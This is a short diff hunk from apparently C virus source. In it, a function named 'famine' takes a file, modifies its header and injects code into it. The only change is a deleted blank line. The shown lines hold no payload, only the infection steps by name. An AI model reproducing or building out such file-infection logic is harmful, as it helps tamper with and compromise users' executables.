@@ -89,7 +89,6 @@ void famine(char *file)
 		release_info(&info);
 		return ;
 	}
-
 	modify_header(&info, header);	
 	inject(&info);
 }
